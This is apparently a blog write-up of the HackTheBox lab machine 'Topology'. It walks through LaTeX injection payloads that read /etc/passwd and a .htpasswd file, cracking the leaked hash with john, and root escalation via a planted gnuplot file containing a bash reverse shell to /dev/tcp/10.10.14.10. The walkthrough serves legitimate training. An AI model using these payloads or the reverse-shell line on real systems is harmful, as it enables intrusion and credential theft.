---
layout: post
title: "HTB: Topology"
author: Andrew Cherney
date: 2023-11-05 15:25:18
tags: htb easy-box linux LaTeX john gnuplot
icon: "assets/icons/topology.png"
post_description: "If obscure math programming languages and plotting tools are up your wheelhouse then this box will be a breeze. An interesting look at the vulnerabilities that lie waiting within academia though either outdated or improperly used tools."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Topology]
└──╼ $nmap -A -sC 10.10.11.217
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-23 17:06 CDT
Nmap scan report for 10.10.11.217
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
echo "10.10.11.217 topology.htb" >> /etc/hosts
```

<h2>Port 80 - http</h2>

{% include img_link src="/img/topology/Topology_front_page" alt="front_page" ext="png" trunc=600 %}

We're greeted with an academic group's accomplishments and projects. Skimming the page we come across one link to a subdomain of ```latex.topology.htb``` so we'll throw that into my hosts file too.

While the topic of subdomains is here why don't we toss a gobuster scan to find other subdomains.

```bash
gobuster vhost -u http://topology.htb -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

We find `dev` and `stats` subdomains as well. 

![Stats page](/img/topology/Topology_stats_page.png)

Network stats available for us to look at, nothing special here. On the `dev` subdomain we are prompted for a username and password. This could indicate there is a `.htpasswd` and `.htaccess` within the directory this is hosted at. We'll keep that in mind if we get LFI. 

Lastly let's see what `latex` has to offer. It looks to be a text to image converter for LaTeX to simplify embedding equations in papers and websites. As of note this page is `equation.php` and if I traverse to the root directory I can see a load of test images and `.tex` files.

![LaTeX equation page](/img/topology/Topology_latex_equation_gener.png)

![LaTeX root directory](/img/topology/Topology_root_direcroty_latex.png)

A small nugget of info the `headers.tex` file mentions vdaisley which could be the user we compromise. 

<h1>User as vdaisley</h1>

<h2>LaTeX Injection</h2>

I dug around for some info surrounding LaTeX and came across [this injection payload list from PayloadAllThethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection). I try all of them till I notice that two *work*:

```tex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

![etc passwd test](/img/topology/Topology_etcpasswd_test.png)

```tex
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
```

The first payload only loads one line whereas the second doesn't show anything but doesn't error out as if the syntax is incorrect. It is of note there is some filter here to prevent users from injecting commands and these two either aren't on the list or bypass it somehow. 

So some time later in searching for LaTeX related exploits I find [this stackexchange talk about inline ](https://tex.stackexchange.com/questions/503/why-is-preferable-to) which is a talk about surrounding characters and which to use. There are three mentioned, `\[`, `$$`, and `$`. Since my second payload was the one that errored out I decided to try these around it for any change in behavior. 

```
$\lstinputlisting{/etc/passwd}$
```

And that ladies and gentlemen displays the entire contents of a file in image form.
The reason this seems to work is those symbols are known as inline math delimiters and force the resulting "equation" to be rendered inline and added to the result rather than being the result. Could be wrong on that. It is of note in [this LaTeX expression guide](https://www.overleaf.com/learn/latex/Mathematical_expressions) there are two other inline delimiters of `\(...\)` and `\begin{math}...\end{math}`, the first errors out and the second is caught as an illegal command. 

Now we loop back to the beginning where we remember `dev` was gated by a password and username. 


```tex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

```
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

<h2>john</h2>

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Topology]
└──╼ $john hash --wordlist=/opt/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (?)
1g 0:00:00:06 DONE (2023-07-23 19:36) 0.1655g/s 164852p/s 164852c/s 164852C/s calebd1..caitlyn09
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Topology]
└──╼ $ssh vdaisley@topology.htb
vdaisley@topology.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

vdaisley@topology:~$ cat user.txt 
4a842033fc2079------------------
```

<h1>Root</h1>

<h2>pspy64</h2>

In my normal enumeration of SUIDs, capabilities, and pspy I come across a looping set of scripts.

```
2023/07/23 21:04:05 CMD: UID=0     PID=1      | /sbin/init 
2023/07/23 21:05:01 CMD: UID=0     PID=2501   | /usr/sbin/CRON -f 
2023/07/23 21:05:01 CMD: UID=0     PID=2500   | /usr/sbin/CRON -f 
2023/07/23 21:05:01 CMD: UID=0     PID=2503   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/23 21:05:01 CMD: UID=0     PID=2502   | /bin/sh -c /opt/gnuplot/getdata.sh 
2023/07/23 21:05:01 CMD: UID=0     PID=2504   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/23 21:05:01 CMD: UID=0     PID=2507   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/23 21:05:01 CMD: UID=0     PID=2506   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/23 21:05:01 CMD: UID=0     PID=2505   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/23 21:05:01 CMD: UID=0     PID=2508   | /usr/sbin/CRON -f 
2023/07/23 21:05:01 CMD: UID=0     PID=2514   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
2023/07/23 21:05:01 CMD: UID=0     PID=2513   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
2023/07/23 21:05:01 CMD: UID=0     PID=2512   | sed s/,//g 
2023/07/23 21:05:01 CMD: UID=0     PID=2511   | cut -d  -f 3 
2023/07/23 21:05:01 CMD: UID=0     PID=2510   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/23 21:05:01 CMD: UID=0     PID=2509   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/23 21:05:01 CMD: UID=0     PID=2517   | gnuplot /opt/gnuplot/networkplot.plt 
```

<h2>gnuplot priv esc</h2>

Initially it seemed worthwhile to try and trick root into running that non-existent CRON file but I didn't have access to change sbin. The other part gnuplot though I found [this priv esc method using a malicious .plt file](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/). 

```bash
vdaisley@topology:~$ touch /opt/gnuplot/test.plt
vdaisley@topology:~$ nano /opt/gnuplot/test.plt
vdaisley@topology:~$ cat /opt/gnuplot/test.plt
system "whoami"

# Reverse shell
system "bash -c 'bash -i >& /dev/tcp/10.10.14.10/7777 0>&1'"
vdaisley@topology:~$ 
```

We're in luck I can add files to opt despite being unable to view that directory or change existing files. Now I can set up netcat and wait.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Topology]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.217] 53262
bash: cannot set terminal process group (2527): Inappropriate ioctl for device
bash: no job control in this shell
root@topology:~# cat /root/root.txt
cat /root/root.txt
78114b488eb8--------------------
```

